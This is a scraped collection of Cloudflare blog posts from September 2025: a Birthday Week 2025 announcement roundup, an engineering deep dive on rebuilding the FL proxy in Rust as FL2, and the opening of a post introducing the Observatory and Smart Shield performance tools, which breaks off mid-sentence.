{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "15 years of helping build a better Internet: a look back at Birthday Week 2025", "url": "https://blog.cloudflare.com/birthday-week-2025-wrap-up/", "published": "Mon, 29 Sep 2025 14:00:00 GMT", "content": "15 years of helping build a better Internet: a look back at Birthday Week 20252025-09-29Nikita CanoKorinne Alpers2 min readThis post is also available in 简体中文, Français, Deutsch, 日本語, 한국어, Español and 繁體中文.Cloudflare launched fifteen years ago with a mission to help build a better Internet. Over that time the Internet has changed and so has what it needs from teams like ours. In this year’s Founder’s Letter, Matthew and Michelle discussed the role we have played in the evolution of the Internet, from helping encryption grow from 10% to 95% of Internet traffic to more recent challenges like how people consume content. We spend Birthday Week every year releasing the products and capabilities we believe the Internet needs at this moment and around the corner. Previous Birthday Weeks saw the launch of IPv6 gateway in 2011, Universal SSL in 2014, Cloudflare Workers and unmetered DDoS protection in 2017, Cloudflare Radar in 2020, R2 Object Storage with zero egress fees in 2021, post-quantum upgrades for Cloudflare Tunnel in 2022, Workers AI and Encrypted Client Hello in 2023. And those are just a sample of the launches.This year’s themes focused on helping prepare the Internet for a new model of monetization that encourages great content to be published, fostering more opportunities to build community both inside and outside of Cloudflare, and evergreen missions like making more features available to everyone and constantly improving the speed and security of what we offer.We shipped a lot of new things this year. In case you missed the dozens of blog posts, here is a breakdown of everything we announced during Birthday Week 2025. Monday, September 22 What In a sentence … Help build the future: announcing Cloudflare’s goal to hire 1,111 interns in 2026 To invest in the next generation of builders, we announced our most ambitious intern program yet with a goal to hire 1,111 interns in 2026. Supporting the future of the open web: Cloudflare is sponsoring Ladybird and Omarchy To support a diverse and open Internet, we are now sponsoring Ladybird (an independent browser) and Omarchy (an open-source Linux distribution and developer environment). Come build with us: Cloudflare’s new hubs for startups We are opening our office doors in four major cities (San Francisco, Austin, London, and Lisbon) as free hubs for startups to collaborate and connect with the builder community. Free access to Cloudflare developer services for non-profit and civil society organizations We extended our Cloudflare for Startups program to non-profits and public-interest organizations, offering free credits for our developer tools. Introducing free access to Cloudflare developer features for students We are removing cost as a barrier for the next generation by giving students with .edu emails 12 months of free access to our paid developer platform features. Cap’n Web: a new RPC system for browsers and web servers We open-sourced Cap'n Web, a new JavaScript-native RPC protocol that simplifies powerful, schema-free communication for web applications. A lookback at Workers Launchpad and a warm welcome to Cohort #6 We announced Cohort #6 of the Workers Launchpad, our accelerator program for startups building on Cloudflare. Tuesday, September 23 What In a sentence … Building unique, per-customer defenses against advanced bot threats in the AI era New anomaly detection system that uses machine learning trained on each zone to build defenses against AI-driven bot attacks. Why Cloudflare, Netlify, and Webflow are collaborating to support Open Source tools To support the open web, we joined forces with Webflow to sponsor Astro, and with Netlify to sponsor TanStack. Launching the x402 Foundation with Coinbase, and support for x402 transactions We are partnering with Coinbase to create the x402 Foundation, encouraging the adoption of the x402 protocol to allow clients and services to exchange value on the web using a common language Helping protect journalists and local news from AI crawlers with Project Galileo We are extending our free Bot Management and AI Crawl Control services to journalists and news organizations through Project Galileo. Cloudflare Confidence Scorecards - making AI safer for the Internet Automated evaluation of AI and SaaS tools, helping organizations to embrace AI without compromising security. Wednesday, September 24 What In a sentence … Automatically Secure: how we upgraded 6,000,000 domains by default Our Automatic SSL/TLS system has upgraded over 6 million domains to more secure encryption modes by default and will soon automatically enable post-quantum connections. Giving users choice with Cloudflare’s new Content Signals Policy The Content Signals Policy is a new standard for robots.txt that lets creators express clear preferences for how AI can use their content. To build a better Internet in the age of AI, we need responsible AI bot principles A proposed set of responsible AI bot principles to start a conversation around transparency and respect for content creators' preferences. Securing data in SaaS to SaaS applications New security tools to give companies visibility and control over data flowing between SaaS applications. Securing today for the quantum future: WARP client now supports post-quantum cryptography (PQC) Cloudflare’s WARP client now supports post-quantum cryptography, providing quantum-resistant encryption for traffic. A simpler path to a safer Internet: an update to our CSAM scanning tool We made our CSAM Scanning Tool easier to adopt by removing the need to create and provide unique credentials, helping more site owners protect their platforms. Thursday, September 25 What In a sentence … Every Cloudflare feature, available to everyone We are making every Cloudflare feature, starting with Single Sign On (SSO), available for anyone to purchase on any plan. Cloudflare's developer platform keeps getting better, faster, and more powerful Updates across Workers and beyond for a more powerful developer platform – such as support for larger and more concurrent Container images, support for external models from OpenAI and Anthropic in AI Search (previously AutoRAG), and more. Partnering to make full-stack fast: deploy PlanetScale databases directly from Workers You can now connect Cloudflare Workers to PlanetScale databases directly, with connections automatically optimized by Hyperdrive. Announcing the Cloudflare Data Platform A complete solution for ingesting, storing, and querying analytical data tables using open standards like Apache Iceberg. R2 SQL: a deep dive into our new distributed query engine A technical deep dive on R2 SQL, a serverless query engine for petabyte-scale datasets in R2. Safe in the sandbox: security hardening for Cloudflare Workers A deep-dive into how we’ve hardened the Workers runtime with new defense-in-depth security measures, including V8 sandboxes and hardware-assisted memory protection keys. Choice: the path to AI sovereignty To champion AI sovereignty, we've added locally-developed open-source models from India, Japan, and Southeast Asia to our Workers AI platform. Announcing Cloudflare Email Service’s private beta We announced the Cloudflare Email Service private beta, allowing developers to reliably send and receive transactional emails directly from Cloudflare Workers. A year of improving Node.js compatibility in Cloudflare Workers There are hundreds of new Node.js APIs now available that make it easier to run existing Node.js code on our platform. Friday, September 26 What In a sentence … Cloudflare just got faster and more secure, powered by Rust We have re-engineered our core proxy with a new modular, Rust-based architecture, cutting median response time by 10ms for millions. Introducing Observatory and Smart Shield New monitoring tools in the Cloudflare dashboard that provide actionable recommendations and one-click fixes for performance issues. Monitoring AS-SETs and why they matter Cloudflare Radar now includes Internet Routing Registry (IRR) data, allowing network operators to monitor AS-SETs to help prevent route leaks. An AI Index for all our customers We announced the private beta of AI Index, a new service that creates an AI-optimized search index for your domain that you control and can monetize. Introducing new regional Internet traffic and Certificate Transparency insights on Cloudflare Radar Sub-national traffic insights and Certificate Transparency dashboards for TLS monitoring. Eliminating Cold Starts 2: shard and conquer We have reduced Workers cold starts by 10x by implementing a new \"worker sharding\" system that routes requests to already-loaded Workers. Network performance update: Birthday Week 2025 The TCP Connection Time (Trimean) graph shows that we are the fastest TCP connection time in 40% of measured ISPs – and the fastest across the top networks. How Cloudflare uses performance data to make the world’s fastest global network even faster We are using our network's vast performance data to tune congestion control algorithms, improving speeds by an average of 10% for QUIC traffic. Code Mode: the better way to use MCP It turns out we've all been using MCP wrong. Most agents today use MCP by exposing the \"tools\" directly to the LLM. We tried something different: Convert the MCP tools into a TypeScript API, and then ask an LLM to write code that calls that API. The results are striking. Come build with us! Helping build a better Internet has always been about more than just technology. Like the announcements about interns or working together in our offices, the community of people behind helping build a better Internet matters to its future. This week, we rolled out our most ambitious set of initiatives ever to support the builders, founders, and students who are creating the future.For founders and startups, we are thrilled to welcome Cohort #6 to the Workers Launchpad, our accelerator program that gives early-stage companies the resources they need to scale. But we’re not stopping there. We’re opening our doors, literally, by launching new physical hubs for startups in our San Francisco, Austin, London, and Lisbon offices. These spaces will provide access to mentorship, resources, and a community of fellow builders.We’re also investing in the next generation of talent. We announced free access to the Cloudflare developer platform for all students, giving them the tools to learn and experiment without limits. To provide a path from the classroom to the industry, we also announced our goal to hire 1,111 interns in 2026 — our biggest commitment yet to fostering future tech leaders.And because a better Internet is for everyone, we’re extending our support to non-profits and public-interest organizations, offering them free access to our production-grade developer tools, so they can focus on their missions.Whether you're a founder with a big idea, a student just getting started, or a team working for a cause you believe in, we want to help you succeed. Until next year Thank you to our customers, our community, and the millions of developers who trust us to help them build, secure, and accelerate the Internet. Your curiosity and feedback drive our innovation.It’s been an incredible 15 years. And as always, we’re just getting started!(Watch the full conversation on our show ThisWeekinNET.com about what we launched during Birthday Week 2025 here.) Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Birthday WeekPartnersDeveloper PlatformWorkers LaunchpadPerformanceSecurityCacheSpeedDevelopersAI1.1.1.1Application SecurityApplication ServicesBotsCDNCloudflare for StartupsCloudflare OneCloudflare Zero TrustCloudflare Workers\nOctober 16, 2025 2:00 PMImproving the trustworthiness of Javascript on the WebThere's no way to audit a site’s client-side code as it changes, making it hard to trust sites that use cryptography. We preview a specification we co-authored that adds auditability to the web....By Michael RosenbergSecurity, Malicious JavaScript, JavaScript, Deep Dive, Cryptography, Research\nOctober 14, 2025 8:00 PMUnpacking Cloudflare Workers CPU Performance BenchmarksCloudflare investigated CPU performance benchmark results for Workers, uncovering and fixing issues in infrastructure, V8 garbage collection, and OpenNext optimizations. ...By Kenton VardaCloudflare Workers, Developer Platform, Developers\nSeptember 30, 2025 3:50 PMPayload on Workers: a full-fledged CMS, running entirely on Cloudflare’s stackWe demonstrate how the open-source Payload CMS was ported to run entirely on Cloudflare's developer platform....By Jason Kincaid, Ricardo TavaresCloudflare Workers\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar", "timestamp": "2025-10-21T13:33:36.708940"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Cloudflare just got faster and more secure, powered by Rust", "url": "https://blog.cloudflare.com/20-percent-internet-upgrade/", "published": "Fri, 26 Sep 2025 14:00:00 GMT", "content": "Cloudflare just got faster and more secure, powered by Rust2025-09-26Richard BoultonSteve GoldsmithMaurizio AbbaMatthew Bullock12 min readCloudflare is relentless about building and running the world’s fastest network. We have been tracking and reporting on our network performance since 2021: you can see the latest update here.Building the fastest network requires work in many areas. We invest a lot of time in our hardware, to have efficient and fast machines. We invest in peering arrangements, to make sure we can talk to every part of the Internet with minimal delay. On top of this, we also have to invest in the software we run our network on, especially as each new product can otherwise add more processing delay.No matter how fast messages arrive, we introduce a bottleneck if that software takes too long to think about how to process and respond to requests. Today we are excited to share a significant upgrade to our software that cuts the median time we take to respond by 10ms and delivers a 25% performance boost, as measured by third-party CDN performance tests.We've spent the last year rebuilding major components of our system, and we've just slashed the latency of traffic passing through our network for millions of our customers. At the same time, we've made our system more secure, and we've reduced the time it takes for us to build and release new products. Where did we start? Every request that hits Cloudflare starts a journey through our network. It might come from a browser loading a webpage, a mobile app calling an API, or automated traffic from another service. These requests first terminate at our HTTP and TLS layer, then pass into a system we call FL, and finally through Pingora, which performs cache lookups or fetches data from the origin if needed. FL is the brain of Cloudflare. Once a request reaches FL, we then run the various security and performance features in our network. It applies each customer’s unique configuration and settings, from enforcing WAF rules and DDoS protection to routing traffic to the Developer Platform and R2. Built more than 15 years ago, FL has been at the core of Cloudflare’s network. It enables us to deliver a broad range of features, but over time that flexibility became a challenge. As we added more products, FL grew harder to maintain, slower to process requests, and more difficult to extend. Each new feature required careful checks across existing logic, and every addition introduced a little more latency, making it increasingly difficult to sustain the performance we wanted.You can see how FL is key to our system — we’ve often called it the “brain” of Cloudflare. It’s also one of the oldest parts of our system: the first commit to the codebase was made by one of our founders, Lee Holloway, well before our initial launch. We’re celebrating our 15th Birthday this week - this system started 9 months before that! commit 39c72e5edc1f05ae4c04929eda4e4d125f86c5ce Author: Lee Holloway <q@t60.(none)> Date: Wed Jan 6 09:57:55 2010 -0800 nginx-fl initial configuration As the commit implies, the first version of FL was implemented based on the NGINX webserver, with product logic implemented in PHP. After 3 years, the system became too complex to manage effectively, and too slow to respond, and an almost complete rewrite of the running system was performed. This led to another significant commit, this time made by Dane Knecht, who is now our CTO. commit bedf6e7080391683e46ab698aacdfa9b3126a75f Author: Dane Knecht Date: Thu Sep 19 19:31:15 2013 -0700 remove PHP. From this point on, FL was implemented using NGINX, the OpenResty framework, and LuaJIT. While this was great for a long time, over the last few years it started to show its age. We had to spend increasing amounts of time fixing or working around obscure bugs in LuaJIT. The highly dynamic and unstructured nature of our Lua code, which was a blessing when first trying to implement logic quickly, became a source of errors and delay when trying to integrate large amounts of complex product logic. Each time a new product was introduced, we had to go through all the other existing products to check if they might be affected by the new logic.It was clear that we needed a rethink. So, in July 2024, we cut an initial commit for a brand new, and radically different, implementation. To save time agreeing on a new name for this, we just called it “FL2”, and started, of course, referring to the original FL as “FL1”. commit a72698fc7404a353a09a3b20ab92797ab4744ea8 Author: Maciej Lechowski Date: Wed Jul 10 15:19:28 2024 +0100 Create fl2 project Rust and rigid modularization We weren’t starting from scratch. We’ve previously blogged about how we replaced another one of our legacy systems with Pingora, which is built in the Rust programming language, using the Tokio runtime. We’ve also blogged about Oxy, our internal framework for building proxies in Rust. We write a lot of Rust, and we’ve gotten pretty good at it.We built FL2 in Rust, on Oxy, and built a strict module framework to structure all the logic in FL2. Why Oxy? When we set out to build FL2, we knew we weren’t just replacing an old system; we were rebuilding the foundations of Cloudflare. That meant we needed more than just a proxy; we needed a framework that could evolve with us, handle the immense scale of our network, and let teams move quickly without sacrificing safety or performance. Oxy gives us a powerful combination of performance, safety, and flexibility. Built in Rust, it eliminates entire classes of bugs that plagued our Nginx/LuaJIT-based FL1, like memory safety issues and data races, while delivering C-level performance. At Cloudflare’s scale, those guarantees aren’t nice-to-haves, they’re essential. Every microsecond saved per request translates into tangible improvements in user experience, and every crash or edge case avoided keeps the Internet running smoothly. Rust’s strict compile-time guarantees also pair perfectly with FL2’s modular architecture, where we enforce clear contracts between product modules and their inputs and outputs.But the choice wasn’t just about language. Oxy is the culmination of years of experience building high-performance proxies. It already powers several major Cloudflare services, from our Zero Trust Gateway to Apple’s iCloud Private Relay, so we knew it could handle the diverse traffic patterns and protocol combinations that FL2 would see. Its extensibility model lets us intercept, analyze, and manipulate traffic from layer 3 up to layer 7, and even decapsulate and reprocess traffic at different layers. That flexibility is key to FL2’s design because it means we can treat everything from HTTP to raw IP traffic consistently and evolve the platform to support new protocols and features without rewriting fundamental pieces.Oxy also comes with a rich set of built-in capabilities that previously required large amounts of bespoke code. Things like monitoring, soft reloads, dynamic configuration loading and swapping are all part of the framework. That lets product teams focus on the unique business logic of their module rather than reinventing the plumbing every time. This solid foundation means we can make changes with confidence, ship them quickly, and trust they’ll behave as expected once deployed. Smooth restarts - keeping the Internet flowing One of the most impactful improvements Oxy brings is handling of restarts. Any software under continuous development and improvement will eventually need to be updated. In desktop software, this is easy: you close the program, install the update, and reopen it. On the web, things are much harder. Our software is in constant use and cannot simply stop. A dropped HTTP request can cause a page to fail to load, and a broken connection can kick you out of a video call. Reliability is not optional.In FL1, upgrades meant restarts of the proxy process. Restarting a proxy meant terminating the process entirely, which immediately broke any active connections. That was particularly painful for long-lived connections such as WebSockets, streaming sessions, and real-time APIs. Even planned upgrades could cause user-visible interruptions, and unplanned restarts during incidents could be even worse.Oxy changes that. It includes a built-in mechanism for graceful restarts that lets us roll out new versions without dropping connections whenever possible. When a new instance of an Oxy-based service starts up, the old one stops accepting new connections but continues to serve existing ones, allowing those sessions to continue uninterrupted until they end naturally.This means that if you have an ongoing WebSocket session when we deploy a new version, that session can continue uninterrupted until it ends naturally, rather than being torn down by the restart. Across Cloudflare’s fleet, deployments are orchestrated over several hours, so the aggregate rollout is smooth and nearly invisible to end users.We take this a step further by using systemd socket activation. Instead of letting each proxy manage its own sockets, we let systemd create and own them. This decouples the lifetime of sockets from the lifetime of the Oxy application itself. If an Oxy process restarts or crashes, the sockets remain open and ready to accept new connections, which will be served as soon as the new process is running. That eliminates the “connection refused” errors that could happen during restarts in FL1 and improves overall availability during upgrades.We also built our own coordination mechanisms in Rust to replace Go libraries like tableflip with shellflip. This uses a restart coordination socket that validates configuration, spawns new instances, and ensures the new version is healthy before the old one shuts down. This improves feedback loops and lets our automation tools detect and react to failures immediately, rather than relying on blind signal-based restarts. Composing FL2 from Modules To avoid the problems we had in FL1, we wanted a design where all interactions between product logic were explicit and easy to understand. So, on top of the foundations provided by Oxy, we built a platform which separates all the logic built for our products into well-defined modules. After some experimentation and research, we designed a module system which enforces some strict rules:No IO (input or output) can be performed by the module.The module provides a list of phases.Phases are evaluated in a strictly defined order, which is the same for every request.Each phase defines a set of inputs which the platform provides to it, and a set of outputs which it may emit.Here’s an example of what a module phase definition looks like: Phase { name: phases::SERVE_ERROR_PAGE, request_types_enabled: PHASE_ENABLED_FOR_REQUEST_TYPE, inputs: vec![ InputKind::IPInfo, InputKind::ModuleValue( MODULE_VALUE_CUSTOM_ERRORS_FETCH_WORKER_RESPONSE.as_str(), ), InputKind::ModuleValue(MODULE_VALUE_ORIGINAL_SERVE_RESPONSE.as_str()), InputKind::ModuleValue(MODULE_VALUE_RULESETS_CUSTOM_ERRORS_OUTPUT.as_str()), InputKind::ModuleValue(MODULE_VALUE_RULESETS_UPSTREAM_ERROR_DETAILS.as_str()), InputKind::RayId, InputKind::StatusCode, InputKind::Visitor, ], outputs: vec![OutputValue::ServeResponse], filters: vec![], func: phase_serve_error_page::callback, } This phase is for our custom error page product. It takes a few things as input — information about the IP of the visitor, some header and other HTTP information, and some “module values.” Module values allow one module to pass information to another, and they’re key to making the strict properties of the module system workable. For example, this module needs some information that is produced by the output of our rulesets-based custom errors product (the “MODULE_VALUE_RULESETS_CUSTOM_ERRORS_OUTPUT” input). These input and output definitions are enforced at compile time.While these rules are strict, we’ve found that we can implement all our product logic within this framework. The benefit of doing so is that we can immediately tell which other products might affect each other. How to replace a running system Building a framework is one thing. Building all the product logic and getting it right, so that customers don’t notice anything other than a performance improvement, is another.The FL code base supports 15 years of Cloudflare products, and it’s changing all the time. We couldn’t stop development. So, one of our first tasks was to find ways to make the migration easier and safer. Step 1 - Rust modules in OpenResty It’s a big enough distraction from shipping products to customers to rebuild product logic in Rust. Asking all our teams to maintain two versions of their product logic, and reimplement every change a second time until we finished our migration was too much.So, we implemented a layer in our old NGINX and OpenResty based FL which allowed the new modules to be run. Instead of maintaining a parallel implementation, teams could implement their logic in Rust, and replace their old Lua logic with that, without waiting for the full replacement of the old system.For example, here’s part of the implementation for the custom error page module phase defined earlier (we’ve cut out some of the more boring details, so this doesn’t quite compile as-written): pub(crate) fn callback(_services: &mut Services, input: &Input<'_>) -> Output { // Rulesets produced a response to serve - this can either come from a special // Cloudflare worker for serving custom errors, or be directly embedded in the rule. if let Some(rulesets_params) = input .get_module_value(MODULE_VALUE_RULESETS_CUSTOM_ERRORS_OUTPUT) .cloned() { // Select either the result from the special worker, or the parameters embedded // in the rule. let body = input .get_module_value(MODULE_VALUE_CUSTOM_ERRORS_FETCH_WORKER_RESPONSE) .and_then(|response| { handle_custom_errors_fetch_response(\"rulesets\", response.to_owned()) }) .or(rulesets_params.body); // If we were able to load a body, serve it, otherwise let the next bit of logic // handle the response if let Some(body) = body { let final_body = replace_custom_error_tokens(input, &body); // Increment a metric recording number of custom error pages served custom_pages::pages_served(\"rulesets\").inc(); // Return a phase output with one final action, causing an HTTP response to be served. return Output::from(TerminalAction::ServeResponse(ResponseAction::OriginError { rulesets_params.status, source: \"rulesets http_custom_errors\", headers: rulesets_params.headers, body: Some(Bytes::from(final_body)), })); } } } The internal logic in each module is quite cleanly separated from the handling of data, with very clear and explicit error handling encouraged by the design of the Rust language.Many of our most actively developed modules were handled this way, allowing the teams to maintain their change velocity during our migration. Step 2 - Testing and automated rollouts It’s essential to have a seriously powerful test framework to cover such a migration. We built a system, internally named Flamingo, which allows us to run thousands of full end-to-end test requests concurrently against our production and pre-production systems. The same tests run against FL1 and FL2, giving us confidence that we’re not changing behaviours.Whenever we deploy a change, that change is rolled out gradually across many stages, with increasing amounts of traffic. Each stage is automatically evaluated, and only passes when the full set of tests have been successfully run against it - as well as overall performance and resource usage metrics being within acceptable bounds. This system is fully automated, and pauses or rolls back changes if the tests fail. The benefit is that we’re able to build and ship new product features in FL2 within 48 hours - where it would have taken weeks in FL1. In fact, at least one of the announcements this week involved such a change! Step 3 - Fallbacks Over 100 engineers have worked on FL2, and we have over 130 modules. And we’re not quite done yet. We're still putting the final touches on the system, to make sure it replicates all the behaviours of FL1.So how do we send traffic to FL2 without it being able to handle everything? If FL2 receives a request, or a piece of configuration for a request, that it doesn’t know how to handle, it gives up and does what we’ve called a fallback - it passes the whole thing over to FL1. It does this at the network level - it just passes the bytes on to FL1.As well as making it possible for us to send traffic to FL2 without it being fully complete, this has another massive benefit. When we have implemented a piece of new functionality in FL2, but want to double check that it is working the same as in FL1, we can evaluate the functionality in FL2, and then trigger a fallback. We are able to compare the behaviour of the two systems, allowing us to get a high confidence that our implementation was correct. Step 4 - Rollout We started running customer traffic through FL2 early in 2025, and have been progressively increasing the amount of traffic served throughout the year. Essentially, we’ve been watching two graphs: one with the proportion of traffic routed to FL2 going up, and another with the proportion of traffic failing to be served by FL2 and falling back to FL1 going down.We started this process by passing traffic for our free customers through the system. We were able to prove that the system worked correctly, and drive the fallback rates down for our major modules. Our Cloudflare Community MVPs acted as an early warning system, smoke testing and flagging when they suspected the new platform might be the cause of a new reported problem. Crucially their support allowed our team to investigate quickly, apply targeted fixes, or confirm the move to FL2 was not to blame. We then advanced to our paying customers, gradually increasing the amount of customers using the system. We also worked closely with some of our largest customers, who wanted the performance benefits of FL2, and onboarded them early in exchange for lots of feedback on the system.Right now, most of our customers are using FL2. We still have a few features to complete, and are not quite ready to onboard everyone, but our target is to turn off FL1 within a few more months. Impact of FL2 As we described at the start of this post, FL2 is substantially faster than FL1. The biggest reason for this is simply that FL2 performs less work. You might have noticed in the module definition example a line filters: vec![], Every module is able to provide a set of filters, which control whether they run or not. This means that we don’t run logic for every product for every request — we can very easily select just the required set of modules. The incremental cost for each new product we develop has gone away.Another huge reason for better performance is that FL2 is a single codebase, implemented in a performance focussed language. In comparison, FL1 was based on NGINX (which is written in C), combined with LuaJIT (Lua, and C interface layers), and also contained plenty of Rust modules. In FL1, we spent a lot of time and memory converting data from the representation needed by one language, to the representation needed by another.As a result, our internal measures show that FL2 uses less than half the CPU of FL1, and much less than half the memory. That’s a huge bonus — we can spend the CPU on delivering more and more features for our customers! How do we measure if we are getting better? Using our own tools and independent benchmarks like CDNPerf, we measured the impact of FL2 as we rolled it out across the network. The results are clear: websites are responding 10 ms faster at the median, a 25% performance boost. Security FL2 is also more secure by design than FL1. No software system is perfect, but the Rust language brings us huge benefits over LuaJIT. Rust has strong compile-time memory checks and a type system that avoids large classes of errors. Combine that with our rigid module system, and we can make most changes with high confidence.Of course, no system is secure if used badly. It’s easy to write code in Rust, which causes memory corruption. To reduce risk, we maintain strong compile time linting and checking, together with strict coding standards, testing and review processes.We have long followed a policy that any unexplained crash of our systems needs to be investigated as a high priority. We won’t be relaxing that policy, though the main cause of novel crashes in FL2 so far has been due to hardware failure. The massively reduced rates of such crashes will give us time to do a good job of such investigations. What’s next? We’re spending the rest of 2025 completing the migration from FL1 to FL2, and will turn off FL1 in early 2026. We’re already seeing the benefits in terms of customer performance and speed of development, and we’re looking forward to giving these to all our customers.We have one last service to completely migrate. The “HTTP & TLS Termination” box from the diagram way back at the top is also an NGINX service, and we’re midway through a rewrite in Rust. We’re making good progress on this migration, and expect to complete it early next year.After that, when everything is modular, in Rust and tested and scaled, we can really start to optimize! We’ll reorganize and simplify how the modules connect to each other, expand support for non-HTTP traffic like RPC and streams, and much more. If you’re interested in being part of this journey, check out our careers page for open roles - we’re always looking for new talent to help us to help build a better Internet. Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Birthday WeekRustNGINXDeep DiveEngineering\nOctober 16, 2025 2:00 PMImproving the trustworthiness of Javascript on the WebThere's no way to audit a site’s client-side code as it changes, making it hard to trust sites that use cryptography. We preview a specification we co-authored that adds auditability to the web....By Michael RosenbergSecurity, Malicious JavaScript, JavaScript, Deep Dive, Cryptography, Research\nOctober 08, 2025 2:00 PMHow we found a bug in Go's arm64 compiler84 million requests a second means even rare bugs appear often. We'll reveal how we discovered a race condition in the Go arm64 compiler and got it fixed....By Thea HeinenDeep Dive, Go, Programming\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 2:00 PMMonitoring AS-SETs and why they matterWe will cover some of the reasons why operators need to monitor the AS-SET memberships for their ASN, and now Cloudflare Radar can help. ...By Mingwei Zhang, Bryton HerdesBGP, RPKI, Birthday Week, Cloudflare Network, Radar", "timestamp": "2025-10-21T13:33:37.421767"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Introducing Observatory and Smart Shield — see how the world sees your website, and make it faster in one click", "url": "https://blog.cloudflare.com/introducing-observatory-and-smart-shield/", "published": "Fri, 26 Sep 2025 14:00:00 GMT", "content": "Introducing Observatory and Smart Shield — see how the world sees your website, and make it faster in one click2025-09-26Tim KadlecBrian BatraskiNoah Maxwell Kennedy15 min readModern users expect instant, reliable web experiences. When your application is slow, they don’t just complain — they leave. Even delays as small as 100 ms have been shown to have a measurable impact on revenue, conversions, bounce rate, engagement and more. If you’re responsible for delivering on these expectations to the users of your product, you know there are many monitoring tools that show you how visitors experience your website, and can let you know when things are slow or causing issues. This is essential, but we believe understanding the condition is only half the story. The real value comes from integrating monitoring and remedies in the same view, giving customers the ability to quickly identify and resolve issues.That's why today, we're excited to launch the new and improved Observatory, now in open beta. This monitoring and observability tool goes beyond charts and graphs, by also telling you exactly how to improve your application's performance and resilience, and immediately showing you the impact of those changes. And we’re releasing it to all subscription tiers (including Free!), available today. But wait, there’s more! To make your users’ experience in Cloudflare even faster, we’re launching Smart Shield, available today for all subscription tiers. Using Observatory, you can pinpoint performance bottlenecks, and for many of the most common issues, you can now apply the fix in just a few clicks with our Smart Shield product. Double the fun! Our unique perspective: leveraging data from 20% of the web Every day, Cloudflare handles traffic for over 20% of the web, giving us a unique vantage point into what makes websites faster and more resilient. We built Observatory to take advantage of this position, uniting data that is normally scattered across different tools — including real-user data, synthetic testing, error rates, and backend telemetry — into a single platform. This gives you a complete, cohesive picture of your application's health end-to-end, in one spot, and enables you to easily identify and resolve performance issues.For this launch, we're bringing together:Real-user data: See how your application performs for real people, in the real world.Back-end telemetry: Break down the lifecycle of a request to pinpoint areas for improvement.Error rates: Understand the stability of your application at both the edge and origin.Cache hit ratios: Ensure you're maximizing the performance of your configuration.Synthetic testing: Proactively test and monitor key endpoints with powerful, accurate simulations.Let's take a quick look at each data set to see how we use them in Observatory. Real-user data There are two primary forms of data collection: real-user data and synthetic data. Real-user data are performance metrics collected from real traffic, from real visitors, to your application. It’s how users are actually seeing your application perform in the real world. It’s unpredictable, and covers every scenario.Synthetic data is data collected using some sort of simulated test (loading a site in a headless browser, making network requests from a testing system to an endpoint, etc.). Tests are run under a predefined set of characteristics — location, network speed, etc. — to provide a consistent baseline.Both forms of data have their uses, and companies with a strongly established culture of operational excellence tend to use both.The first data you’ll see when you visit Observatory is real-user data collected with Real User Monitoring (RUM), with a particular focus on the Core Web Vital metrics. This is very intentional.Real-user data should be the source of truth when it comes to measuring performance and resiliency of your application. Even the best of synthetic data sources are always going to be an approximation. They cannot cover every possible scenario, and because they are being run from a lab environment, they will not always reveal issues that may be more sporadic and unpredictable.They’re also the best representation of what your users are experiencing when they access your site and, at the end of the day, that’s why we focus on improving performance, resiliency, and security for our users.We believe so strongly in the importance of every company having access to accurate, detailed RUM data that we are providing it for free, to all accounts. In fact, we’re about to make our privacy-first analytics — which doesn’t track individual users for analytics — available by default for all free zones (excluding data from EU or UK visitors), no setup necessary. We believe the right thing is arming everyone with detailed, actionable, real-user data, and we want to make it easy. Backend telemetry Front-end performance metrics are our best proxy for understanding the actual user experience of an application and as a result, they work great as key performance indicators (KPI’s).But they’re not enough. Every primary metric should have some level of supporting diagnostic metrics that help us understand why our user metrics are performing like they are — so that we can quickly identify issues, bottlenecks, and areas of improvement. While the industry has largely, and rightfully, moved on from Time to First Byte (TTFB) as a primary metric of focus, it still has value as a diagnostic metric. In fact, we analyzed our RUM data and found a very strong connection between Time to First Byte and Largest Contentful Paint.Google’s recommended thresholds for Time to First Byte are:Good: <= 800msNeeds Improvement: > 800ms and <= 1800msPoor: > 1800msSimilarly, their official thresholds for Largest Contentful Paint are:Good: <= 2500msNeeds Improvement > 2500ms and <= 4000msPoor: > 4000msLooking across over 9 billion events, we found that when compared to the average site, sites with a “poor” (>1800ms) TTFB are:70.1 percentage points less likely to have a “good” LCP21.9 percentage points more likely to have a “needs improvement” LCP48.2 percentage points more likely to have a “poor” LCPTTFB is an ill-defined blackbox, so we’re making a point to break that down into its various subparts so you can quickly pinpoint if the issue is with the connection establishment, the server response time, the network itself, and more. We’ll be working to break this down even further in the coming months as we expose the complete lifecycle of a request so you’re able to pinpoint exactly where the bottlenecks lie. Errors & cache ratios Degradation in stability and performance are frequently directly connected to configuration changes or an increase in errors. Clear visibility into these characteristics can often cut right to the heart of the issue at hand, as well as point to opportunities for improvement of the overall efficiency and effectiveness of your application. Observatory prominently surfaces cache hit ratio and error rates for both the edge and origin. This compliments the backend telemetry nicely, and helps to further breakdown the backend metrics you are seeing to help pinpoint areas of improvement.Take cache hit ratio for example. Intuitively, we know that when content is served from cache on an edge server, it should be faster than when the request has to go 